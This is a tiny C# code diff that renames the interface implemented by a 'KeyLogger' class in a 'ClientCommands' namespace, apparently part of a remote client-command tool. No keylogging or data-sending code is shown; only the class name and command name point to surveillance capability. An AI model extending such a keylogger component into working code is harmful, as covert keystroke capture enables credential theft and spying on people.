@@ -3,7 +3,7 @@ using System.Collections.Generic;
 
 namespace ClientCommands
 {
-    internal class KeyLogger : ICommand
+    internal class KeyLogger : IClientCommand
     {
         public string name { get; } = "keylogger";
 
